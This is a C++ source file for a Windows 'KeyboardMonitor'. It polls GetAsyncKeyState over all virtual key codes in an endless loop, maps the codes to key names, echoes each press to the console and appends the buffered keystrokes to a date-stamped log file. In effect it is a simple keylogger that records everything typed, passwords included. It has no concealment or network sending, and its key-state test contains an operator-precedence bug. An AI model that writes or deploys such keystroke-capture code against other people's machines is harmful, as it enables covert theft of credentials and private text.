#include <fstream>
#include <iostream>
#include <windows.h>
#include <winuser.h>

#include "KeyboardMonitor.h"

KeyboardEvent::KeyboardEvent(short virtualKeyCode):
	BaseEvent(),
	m_virtualKeyCode(virtualKeyCode)
{
	m_type = EVENT_KEYBOARD;
}

std::string KeyboardEvent::getString(void)
{
	switch (m_virtualKeyCode)
	{
	case 0x01: return "Left Mouse";
	case 0x02: return "Right Mouse";
	case 0x03: return "Control-break processing";
	case 0x04: return "Middle Mouse";
	case 0x05: return "X1 Mouse";
	case 0x06: return "X2 Mouse";
	case 0x07: return "Undefined";
	case 0x08: return "Backspace";
	case 0x09: return "Tab";
	// Skip
	case 0x0C: return "Clear";
	case 0x0D: return "Enter";
	case 0x10: return "Shift";
	case 0x11: return "Ctrl";
	case 0x12: return "Alt";
	case 0x13: return "Pause";
	case 0x14: return "Capslock";
	// SKip
	case 0x1B: return "Esc";
	case 0x20: return "Spacebar";
	case 0x21: return "Page Up";
	case 0x22: return "Page Down";
	case 0x23: return "End";
	case 0x24: return "Home";
	case 0x25: return "Left Arrow";
	case 0x26: return "Up Arrow";
	case 0x27: return "Right Arrow";
	case 0x28: return "Down Arrow";
	case 0x29: return "Select";
	case 0x2A: return "Print";
	case 0x2B: return "Execute";
	case 0x2C: return "Print Screen";
	case 0x2D: return "INS";
	case 0x2E: return "Del";
	case 0x2F: return "Help";
	// Skip
	case 0x5B: return "Left Windows";
	case 0x5C: return "Right Windows";
	// Skip
	case 0xA0: return "Left Shift";
	case 0xA1: return "Right Shift";
	case 0xA2: return "Left Control";
	case 0xA3: return "Right Control";

	default:
	{
		std::stringstream stream;
		stream << getCharacter();
		return stream.str();
	}
	}
}

KeyboardMonitor::KeyboardMonitor(void):
	m_maxListSize(DEFAULT_MAX_LIST_SIZE),
	m_writeToLog(false),
	m_logFilePath()
{
}

KeyboardMonitor::KeyboardMonitor(std::string logFilePath):
	m_maxListSize(DEFAULT_MAX_LIST_SIZE),
	m_writeToLog(true),
	m_logFilePath(logFilePath)
{
}

KeyboardMonitor::KeyboardMonitor(std::string logFilePath, unsigned int maxListSize):
	m_maxListSize(maxListSize),
	m_writeToLog(true),
	m_logFilePath(logFilePath)
{
}

KeyboardMonitor::~KeyboardMonitor(void)
{
}

void KeyboardMonitor::operator()()
{
	int count = 0;

	while(true)
	{
		for (int virtualKeyCode = 0x01; virtualKeyCode <= 0xFE; ++virtualKeyCode)
		{
			short result = GetAsyncKeyState(virtualKeyCode);

			if (result & KEY_CURRENTLY_PRESSED_MASK > 0)
			{
				m_keyboardEventList.emplace_back(KeyboardEvent(virtualKeyCode));

				std::cout << m_keyboardEventList.back().toString() << std::endl;
				
				// Write to log every 100 event
				if (m_writeToLog && m_keyboardEventList.size() > m_maxListSize)
				{
					(void)appendToFile();
					std::cout << "Write to log" << std::endl;
				}
			}
		}
	}
}

bool KeyboardMonitor::appendToFile(void)
{
	if (!m_writeToLog || m_logFilePath.empty())
	{
		return false;
	}

	if (m_keyboardEventList.empty())
	{
		return true;
	}

	SYSTEMTIME localTime = m_keyboardEventList.front().getLocalTime();

	std::ostringstream logFilePath;
	logFilePath << m_logFilePath << "_" << localTime.wYear << "_" << localTime.wMonth << "_" << localTime.wDay << ".log";

	std::ofstream outfile;
	outfile.open(logFilePath.str(), std::ios_base::app);
	
	auto iter = m_keyboardEventList.begin();
	while (!m_keyboardEventList.empty())
	{
		outfile << iter->toString() << "\n";
		iter = m_keyboardEventList.erase(iter);
	}

	outfile.close();

	return true;
}